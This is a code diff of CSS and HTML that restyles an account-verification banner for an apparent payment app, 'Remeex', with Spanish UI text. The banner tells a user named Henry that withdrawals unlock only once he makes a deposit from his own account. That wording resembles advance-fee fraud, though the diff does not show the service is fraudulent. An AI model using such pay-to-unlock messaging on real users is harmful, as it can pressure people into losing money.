@@ -3133,6 +3133,80 @@
   gap: 0.5rem;
 }
 
+/* New Verification Banner */
+.verificacion-banner {
+  background: var(--neutral-100);
+  border-radius: var(--radius-lg);
+  padding: 1rem;
+  box-shadow: var(--shadow-sm);
+  margin-bottom: 1.25rem;
+}
+
+.verificacion-banner h3 {
+  margin-bottom: 0.25rem;
+  color: var(--visa-blue);
+  font-size: 0.95rem;
+}
+
+.verificacion-banner p {
+  font-size: 0.8rem;
+  margin-bottom: 0.75rem;
+}
+
+.verificacion-grid {
+  display: flex;
+  flex-direction: column;
+  gap: 1rem;
+}
+
+.verificacion-card {
+  width: 100%;
+  display: flex;
+  align-items: flex-start;
+  gap: 0.75rem;
+  background: var(--neutral-100);
+  border-radius: var(--radius-md);
+  padding: 0.75rem 1rem;
+  box-shadow: var(--shadow-sm);
+}
+
+.verificacion-card .icono {
+  font-size: 1.4rem;
+  line-height: 1;
+  color: var(--success-green);
+}
+
+.verificacion-card.pendiente .icono {
+  color: var(--warning-orange);
+}
+
+.verificacion-card .contenido {
+  flex: 1;
+}
+
+.verificacion-card .botones {
+  margin-top: 0.5rem;
+  display: flex;
+  flex-wrap: wrap;
+  gap: 0.5rem;
+}
+
+.verificacion-card .botones button {
+  flex: 1;
+  padding: 0.4rem 0.6rem;
+  border: none;
+  background: var(--visa-blue);
+  color: #fff;
+  border-radius: var(--radius-sm);
+  font-size: 0.75rem;
+  cursor: pointer;
+  transition: var(--transition-base);
+}
+
+.verificacion-card .botones button:hover {
+  background: var(--primary-light);
+}
+
 @keyframes checkmarkPulse {
   0%, 100% {
     transform: scale(1);
@@ -4456,71 +4530,43 @@
         </div>
 
        <!-- NUEVA IMPLEMENTACIÓN: Verification Processing Banner -->
-<div class="verification-processing-banner card" id="verification-processing-banner">
-  <div class="verification-processing-icon" id="verification-processing-icon">
-    <i class="fas fa-id-card"></i>
-  </div>
-  <div class="verification-processing-content">
-    <div class="verification-processing-title" id="verification-processing-title">Verificando Documentos</div>
-    <div class="verification-processing-text" id="verification-processing-text">Estamos revisando su documentación. Este proceso puede tardar unos minutos.</div>
-    <div class="verification-note" id="verification-note">Puedes cerrar sesión, no es necesario permanecer en línea. Puedes volver en cualquier momento.</div>
-    <div class="verification-progress-container" id="verification-progress-container" style="display:none;">
-      <div class="verification-progress-bar" id="verification-progress-bar"></div>
-    </div>
-    
-    <div class="verification-progress-percent" id="verification-progress-percent">0%</div>
+<div class="verificacion-banner">
+  <h3>✔️ Verificación en Progreso</h3>
+  <p>Henry, hemos completado la verificación de tus documentos. Falta un último paso para activar todas las funciones.</p>
 
-<!-- Status Cards -->
-<div class="verification-status-cards" id="verification-status-cards" style="display:none;">
-  <div class="verification-status-item verificacion-item card" id="status-documents">
-    <div class="status-icon-container">
-      <i class="fas fa-check-circle status-icon success"></i>
-    </div>
-    <div class="status-text">
-      <div class="status-label">Documentos de Identidad</div>
-      <div class="status-sublabel" id="documents-info">Cédula XXXX | Titular Nombre</div>
-    </div>
-  </div>
-
-  <div class="verification-status-item verificacion-item card" id="status-bank">
-    <div class="status-icon-container">
-      <i class="fas fa-check-circle status-icon success"></i>
-    </div>
-    <div class="status-text">
-      <div class="status-label">Cuenta de banco registrada con éxito</div>
-      <div class="status-sublabel" id="bank-registered-info"><img src="" alt="" id="bank-logo-mini" class="bank-logo-mini"> Banco | Cuenta N° XXXX</div>
-    </div>
-  </div>
-
-  <div class="verification-status-item verificacion-item card" id="status-bank-validation">
-    <div class="status-icon-container">
-      <i class="fas fa-hourglass-half status-icon warning"></i>
-    </div>
-    <div class="status-text">
-      <div class="status-label">Validación de datos de cuenta pendiente</div>
-      <div class="status-sublabel" id="validation-info">Para validar debes recargar desde tu propia cuenta y así habilitar tus retiros.</div>
-      <div class="validation-actions">
-        <button class="btn btn-outline btn-small" id="start-recharge">Validar, realizar recarga</button>
-        <button class="btn btn-outline btn-small" id="view-status">Mi Estatus</button>
-        <button class="btn btn-outline btn-small" id="bank-support">Soporte</button>
+  <div class="verificacion-grid">
+    <!-- Tarjeta: Documentos -->
+    <div class="verificacion-card">
+      <div class="icono">✅</div>
+      <div class="contenido">
+        <strong>Documentos de Identidad</strong>
+        <p>Cédula XXXX | Titular Nombre</p>
       </div>
     </div>
-    <div class="validation-benefits-banner" id="validation-benefits-banner" style="display: none;">
-      <div class="validation-benefits-icon">
-        <i class="fas fa-unlock-alt"></i>
+
+    <!-- Tarjeta: Cuenta de banco -->
+    <div class="verificacion-card">
+      <div class="icono">✅</div>
+      <div class="contenido">
+        <strong>Cuenta de banco registrada con éxito</strong>
+        <p>Banco | Cuenta Nº XXXX</p>
       </div>
-      <div class="validation-benefits-content">
-        <div class="validation-benefits-title">¿Qué obtienes al validar?</div>
-        <div class="validation-benefits-text">Retiros habilitados a tu banco hasta 5.000 USD por mes y desbloqueo de todas las funcionalidades y beneficios de Remeex.</div>
+    </div>
+
+    <!-- Tarjeta: Validación pendiente -->
+    <div class="verificacion-card pendiente">
+      <div class="icono">⏳</div>
+      <div class="contenido">
+        <strong>Validación de datos de cuenta pendiente</strong>
+        <p>Para validar debes recargar desde tu propia cuenta y así habilitar tus retiros.</p>
+        <div class="botones">
+          <button>Validar, realizar recarga</button>
+          <button>Mi Estatus</button>
+          <button>Soporte</button>
+        </div>
       </div>
     </div>
   </div>
-</div>
-  </div>
-  <div class="verification-processing-spinner" id="main-processing-spinner"></div>
-  <a href="https://wa.me/+17373018059" class="verification-support-btn whatsapp-link" target="_blank">
-    <i class="fab fa-whatsapp"></i> Soporte
-  </a>
 </div>
 
         <!-- First Recharge Banner (if no recharges yet) -->
